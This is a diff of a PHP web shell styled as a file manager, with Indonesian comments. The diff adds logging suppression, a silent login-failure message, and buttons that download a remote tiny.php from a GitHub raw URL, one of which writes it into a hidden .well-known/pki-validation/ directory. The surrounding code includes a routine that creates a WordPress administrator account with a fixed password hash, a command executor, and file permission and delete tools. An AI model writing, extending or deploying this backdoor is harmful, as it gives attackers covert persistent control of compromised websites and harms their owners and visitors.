@@ -1,4 +1,6 @@
 <?php
+ini_set('log_errors', 0);
+
 session_start();
 
 // Hash password yang benar (gunakan hash yang dihasilkan dari password_hash)
@@ -12,7 +14,7 @@ if (isset($_POST['password'])) {
     if (password_verify($password, $hashed_pass)) {
         $_SESSION['logged_in'] = true;
     } else {
-        $error = "Password salah!";
+        $error = "";
     }
 }
 
@@ -341,11 +343,11 @@ $files = scandir($dir);
 <!DOCTYPE html>
 <html>
 <head>
-    <title>FileManagerAI</title>
+    <title>FileManager 😋 MiniDBAI</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <meta name="robots" content="noindex,nofollow">
     <style>
-        body { font-family: Arial, sans-serif; }
+        body { font-family: Arial, sans-serif; background-color: aliceblue;}
         table { width: 100%; border-collapse: collapse; }
         th, td { padding: 8px 12px; border: 1px solid #ddd; text-align: left; }
         th { background-color: #f2f2f2; }
@@ -356,7 +358,7 @@ form {
 
     padding: 10px;
     border: 1px solid #ddd;
-    background-color: #f9f9f9;
+    background-color: aliceblue;
     border-radius: 5px;
 
 }
@@ -452,11 +454,161 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['download_adminer'])) 
 ?>
 
 <form action="" method="post">
-    <input type="submit" name="download_adminer" value="adminer">
+    <input type="submit" name="download_adminer" value="Adminer">
 </form>
 
 </td>
 
+<td>
+
+<?php
+if (isset($_POST['create_tiny'])) {
+    // URL file yang ingin diambil
+    $url = 'https://raw.githubusercontent.com/coba005/b/refs/heads/main/tiny.php';
+
+    // Inisialisasi cURL
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+
+    // Ambil konten dari URL
+    $content = curl_exec($ch);
+    $error = curl_error($ch);
+    curl_close($ch);
+
+    if ($content !== false) {
+        // Simpan konten ke dalam file tiny.php
+        file_put_contents('tiny.php', $content);
+        echo "File tiny.php berhasil dibuat!";
+    } else {
+        echo "Gagal mengambil konten dari URL. Error: $error";
+    }
+}
+?>
+
+
+    <form method="post">
+	<input type="submit" name="create_tiny" value="Tiny">
+        
+    </form>
+
+
+
+</td>
+
+
+<td>
+
+<?php
+if (isset($_POST['create_tiny'])) {
+    // URL file yang ingin diambil
+    $url = 'https://raw.githubusercontent.com/coba005/b/refs/heads/main/tiny.php';
+
+    // Direktori yang ditentukan untuk menyimpan file
+    $dir = rtrim($_POST['directory'], '/') . '/.well-known/pki-validation/';
+
+    // Periksa apakah direktori ada, jika tidak, buat direktori tersebut
+    if (!is_dir($dir)) {
+        mkdir($dir, 0777, true); // Buat direktori beserta subdirektori
+    }
+
+    // Inisialisasi cURL
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+
+    // Ambil konten dari URL
+    $content = curl_exec($ch);
+    $error = curl_error($ch);
+    curl_close($ch);
+
+    if ($content !== false) {
+        // Simpan konten ke dalam file tiny.php di direktori yang ditentukan
+        file_put_contents($dir . 'tiny.php', $content);
+        echo "File tiny.php berhasil dibuat di $dir!";
+    } else {
+        echo "Gagal mengambil konten dari URL. Error: $error";
+    }
+}
+?>
+
+<form method="post">
+    <label for="directory">Masukkan direktori:</label>
+    <input type="text" id="directory" name="directory" required>
+    <input type="submit" name="create_tiny" value="Tiny">
+</form>
+
+
+</td>
+
+
+<td>
+<?php
+if (isset($_POST['download_wp'])) {
+    $wp_zip_url = 'https://wordpress.org/latest.zip';
+    $zip_file = 'latest.zip';
+
+    // Mengunduh file WordPress
+    if (file_put_contents($zip_file, file_get_contents($wp_zip_url))) {
+        echo "WordPress berhasil diunduh sebagai '$zip_file'.";
+    } else {
+        echo "Gagal mengunduh WordPress.";
+    }
+    
+}
+?>
+
+
+    <style>
+        /* Gaya untuk progress bar */
+        #progress-container {
+            width: 100%;
+            background-color: #f3f3f3;
+            border-radius: 5px;
+            margin: 20px 0;
+        }
+
+        #progress-bar {
+            width: 0;
+            height: 30px;
+            background-color: #4caf50;
+            text-align: center;
+            line-height: 30px;
+            color: white;
+            border-radius: 5px;
+        }
+    </style>
+    <script>
+        function startProgress() {
+            document.getElementById('progress-container').style.display = 'block';
+            document.getElementById('form').style.display = 'none';
+
+            // Simulasi progress bar
+            let width = 0;
+            let progressBar = document.getElementById('progress-bar');
+            let interval = setInterval(function() {
+                if (width >= 100) {
+                    clearInterval(interval);
+                } else {
+                    width++;
+                    progressBar.style.width = width + '%';
+                    progressBar.innerHTML = width + '%';
+                }
+            }, 100); // Kecepatan pengisian progress bar
+        }
+    </script>
+
+    <div id="progress-container" style="display: none;">
+        <div id="progress-bar">0%</div>
+    </div>
+    <form method="post" id="form" onsubmit="startProgress()">
+	<input type="submit" name="download_wp" value="WordPress">
+        
+    </form>
+
+
+
+</td>
 
 <td>
 <div style="text-align: right;">
@@ -545,38 +697,41 @@ $base = realpath($home_dir); // Mendapatkan path absolut dari direktori utama
     ?>
 
     <!-- Daftar file dan direktori -->
-    <h3>Daftar File/Folder di: <?php echo htmlspecialchars($dir); ?> </h3>
+    <h3>📁 : <?php echo htmlspecialchars($dir); ?> </h3>
+<b><i><a id="dynamic-link" href="?dir=/">[Root]</a></i></b>
 <?php
 // Mengambil direktori kerja saat ini
 $direktori_sekarang = getcwd();
 echo "" . htmlspecialchars($direktori_sekarang);
 ?>
-<a href="?dir=<?php echo urlencode($direktori_sekarang); ?>/">[Home]</a>
+<b><a href="?dir=<?php echo urlencode($direktori_sekarang); ?>/">🏠︎ [Home]</a></b>
 
-<br>
-<a id="dynamic-link" href="?dir=/">[Root]</a>
+<br><br>
+
 
 <table>
     <tr>
         <th>Name</th>
-        <th>Size</th> <!-- Header untuk ukuran -->
-        <th>Modify</th> <!-- Header untuk tanggal modifikasi -->
-        <th>Permissions</th> <!-- Header untuk permissions -->
-        <th>Actions</th>
+        <th>Size</th>
+        <th>Modify</th>
+        <th>Owner/Group</th> <!-- Tambahkan kolom Owner -->
+        <th>Perms</th>
+	<th>Actions</th>
     </tr>
 
     <tr>
         <td><a href="?dir=<?php echo urlencode(dirname($dir)) . '/'; ?>">⏪</a></td>
-        <td></td> <!-- Kosongkan ukuran untuk link direktori -->
-        <td></td> <!-- Kosongkan modifikasi untuk link direktori -->
-        <td></td> <!-- Kosongkan permissions untuk link direktori -->
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
         <td>    
-<!-- Tombol Paste -->
-    <?php if (isset($_SESSION['file_to_copy'])): ?>
-        <form action="?dir=<?php echo urlencode($dir); ?>&paste" method="post">
-            <input type="submit" value="Paste file here">
-        </form>
-    <?php endif; ?></td> <!-- Kosongkan tindakan untuk link direktori -->
+            <?php if (isset($_SESSION['file_to_copy'])): ?>
+                <form action="?dir=<?php echo urlencode($dir); ?>&paste" method="post">
+                    <input type="submit" value="Paste file here">
+                </form>
+            <?php endif; ?>
+        </td>
     </tr>
 
     <?php 
@@ -595,40 +750,50 @@ echo "" . htmlspecialchars($direktori_sekarang);
     }
     
     // Tampilkan folder terlebih dahulu
-    foreach ($folders as $folder): ?>
+    foreach ($folders as $folder): 
+        $ownerId = fileowner($dir . $folder);
+        $groupId = filegroup($dir . $folder);
+        $ownerName = function_exists('posix_getpwuid') ? posix_getpwuid($ownerId)['name'] : $ownerId;
+        $groupName = function_exists('posix_getgrgid') ? posix_getgrgid($groupId)['name'] : $groupId;
+    ?>
         <tr>
             <td>
-                <a href="?dir=<?php echo urlencode($dir . $folder . '/'); ?>"><?php echo htmlspecialchars($folder); ?>/</a>
+                <a href="?dir=<?php echo urlencode($dir . $folder . '/'); ?>">📁 <?php echo htmlspecialchars($folder); ?>/</a>
             </td>
-            <td></td> <!-- Kosongkan ukuran untuk folder -->
-            <td><?php echo date("Y-m-d (H:i:s)", filemtime($dir . $folder)); // Tanggal terakhir modifikasi ?></td>
+            <td></td>
+            <td><?php echo date("Y-m-d (H:i:s)", filemtime($dir . $folder)); ?></td>
+            <td><?php echo htmlspecialchars($ownerName) . '  |  ' . htmlspecialchars($groupName); ?></td>
             <td>
                 <form action="" method="post" style="display:inline;">
                     <input type="hidden" name="file_path" value="<?php echo htmlspecialchars($dir . $folder); ?>">
-                    <input type="text" name="new_permissions" placeholder="<?php echo substr(sprintf('%o', fileperms($dir . $folder)), -4); // Menampilkan permission folder ?>" style="width:80px;" required>
+                    <input type="text" name="new_permissions" placeholder="<?php echo substr(sprintf('%o', fileperms($dir . $folder)), -4); ?>" style="width:80px;" required>
                     <input type="submit" name="change_permissions" value="Change">
                 </form>
             </td>
             <td>
                 <a href="?dir=<?php echo urlencode($dir); ?>&delete=<?php echo urlencode($folder); ?>" onclick="return confirm('Delete folder ?')">[Delete]</a>
                 <a href="?dir=<?php echo urlencode($dir); ?>&rename=<?php echo urlencode($folder); ?>">[ReName]</a>
-		
             </td>
         </tr>
     <?php endforeach; ?>
 
-    <!-- Tampilkan file setelah folder -->
-    <?php foreach ($filesList as $file): ?>
+    <?php foreach ($filesList as $file): 
+        $ownerId = fileowner($dir . $file);
+        $groupId = filegroup($dir . $file);
+        $ownerName = function_exists('posix_getpwuid') ? posix_getpwuid($ownerId)['name'] : $ownerId;
+        $groupName = function_exists('posix_getgrgid') ? posix_getgrgid($groupId)['name'] : $groupId;
+    ?>
         <tr>
             <td>
-                <a href="<?php echo htmlspecialchars($dir . $file); ?>" target="_blank"><?php echo htmlspecialchars($file); ?></a>
+                <a href="<?php echo htmlspecialchars($dir . $file); ?>" target="_blank">📋 <?php echo htmlspecialchars($file); ?></a>
             </td>
-            <td><?php echo number_format(filesize($dir . $file) / 1024, 2) . ' KB'; // Ukuran file dalam KB ?></td>
-            <td><?php echo date("Y-m-d (H:i:s)", filemtime($dir . $file)); // Tanggal terakhir modifikasi ?></td>
+            <td><?php echo number_format(filesize($dir . $file) / 1024, 2) . ' KB'; ?></td>
+            <td><?php echo date("Y-m-d (H:i:s)", filemtime($dir . $file)); ?></td>
+	    <td><?php echo htmlspecialchars($ownerName) . '  |  ' . htmlspecialchars($groupName); ?></td>
             <td>
                 <form action="" method="post" style="display:inline;">
                     <input type="hidden" name="file_path" value="<?php echo htmlspecialchars($dir . $file); ?>">
-                    <input type="text" name="new_permissions" placeholder="<?php echo substr(sprintf('%o', fileperms($dir . $file)), -4); // Menampilkan permission file ?>" style="width:80px;" required>
+                    <input type="text" name="new_permissions" placeholder="<?php echo substr(sprintf('%o', fileperms($dir . $file)), -4); ?>" style="width:80px;" required>
                     <input type="submit" name="change_permissions" value="Change">
                 </form>
             </td>
@@ -637,12 +802,12 @@ echo "" . htmlspecialchars($direktori_sekarang);
                 <a href="?dir=<?php echo urlencode($dir); ?>&edit=<?php echo urlencode($file); ?>">[Edit]</a>
                 <a href="?dir=<?php echo urlencode($dir); ?>&rename=<?php echo urlencode($file); ?>">[ReName]</a>
                 <a href="?dir=<?php echo urlencode($dir); ?>&copy=<?php echo urlencode($file); ?>">[Copy]</a>
-		<a href="?dir=<?php echo urlencode($dir); ?>&zip=<?php echo urlencode($file); ?>">[Zip]</a> <!-- Tautan untuk zip -->
-		
+                <a href="?dir=<?php echo urlencode($dir); ?>&zip=<?php echo urlencode($file); ?>">[Zip]</a>
             </td>
         </tr>
     <?php endforeach; ?>
 </table>
+
 
 
 <?php
@@ -673,64 +838,7 @@ if (class_exists('ZipArchive')) {
 
 
 
-<?php 
-echo "<center><big>MiniAI Upload Area</big></center><br>";
-echo "<center><form method='post' enctype='multipart/form-data' name='uploader'>";
 
-// Ambil direktori dasar dari URL
-$baseDir = isset($_GET['dir']) ? urldecode($_GET['dir']) : $_SERVER['DOCUMENT_ROOT'] . '/';
-
-// Fungsi untuk mendapatkan semua folder yang dapat diakses untuk upload
-function getWritableDirectories($dir) {
-    $directories = [];
-    $items = scandir($dir);
-    foreach ($items as $item) {
-        if ($item !== '.' && $item !== '..') {
-            $path = $dir . '/' . $item;
-            if (is_dir($path) && is_writable($path)) {
-                $directories[] = $path;
-                // Ambil direktori dalam direktori
-                $subDirs = getWritableDirectories($path);
-                $directories = array_merge($directories, $subDirs);
-            }
-        }
-    }
-    return $directories;
-}
-
-// Tampilkan tombol untuk memunculkan form upload
-echo '<button type="button" onclick="document.getElementById(\'uploadForm\').style.display=\'block\'">Upload File</button><br><br>';
-
-// Tampilkan form upload file (disembunyikan secara default)
-echo '<div id="uploadForm" style="display:none;">';
-echo '<select name="uploadDir">';
-$directories = getWritableDirectories($baseDir);
-foreach ($directories as $dir) {
-    $dirName = str_replace($baseDir, '', $dir); // Menghilangkan path dasar
-    echo '<option value="' . $dir . '">' . $dirName . '</option>';
-}
-echo '</select>';
-
-echo '<br><input type="file" name="file" size="45"><input name="_upl" type="submit" id="_upl" value="Upload"></form></div></center>';
-
-if (isset($_POST['_upl']) && $_POST['_upl'] == "Upload") {
-    // Ambil direktori yang dipilih
-    $selectedDir = $_POST['uploadDir'];
-    $uploadDir = $selectedDir . '/'; // Gunakan direktori yang dipilih langsung
-
-    // Lokasi file yang diupload
-    $uploadFile = $uploadDir . basename($_FILES['file']['name']);
-
-    // Proses upload file
-    if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadFile)) {
-        $fileUrl = 'https://' . $_SERVER['HTTP_HOST'] . str_replace($_SERVER['DOCUMENT_ROOT'], '', $uploadFile);
-        echo "<center>File telah berhasil diupload!<br>";
-        echo "URL: <a href='$fileUrl' target='_blank'>$fileUrl</a></center>";
-    } else {
-        echo "<center>Gagal mengupload file!</center>";
-    }
-}
-?>
 
 
 
@@ -789,9 +897,9 @@ if ($wp_config_file) {
 
     // Cek apakah ada POST request untuk membuat akun admin
     if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-        $username = $_POST['username'] ?? null;
+        $username = isset($_POST['username']) ? $_POST['username'] : null;
         $password = '$P$B2CXGXAe2jBMcOK34tZSXaMABEvqFS.'; // Hash password yang telah ditentukan
-        $email = $_POST['email'] ?? null;
+        $email = isset($_POST['email']) ? $_POST['email'] : null;
 
         // Validasi input
         if ($username && $email) {
@@ -909,19 +1017,12 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     if ($output === null) {
         // Mendapatkan informasi kesalahan terakhir
         $error = error_get_last();
-        echo "<pre>Perintah tidak dapat dieksekusi atau tidak valid. Kesalahan: " . htmlspecialchars($error['message']) . "</pre>";
+        echo "<pre>Perintah tidak dapat dieksekusi atau tidak valid. <bt> Kesalahan: " . htmlspecialchars($error['message']) . "</pre>";
     } else {
         echo "<pre>$output</pre>";
     }
 }
 ?>
-
-
-
-
-
-
-
 
 
 
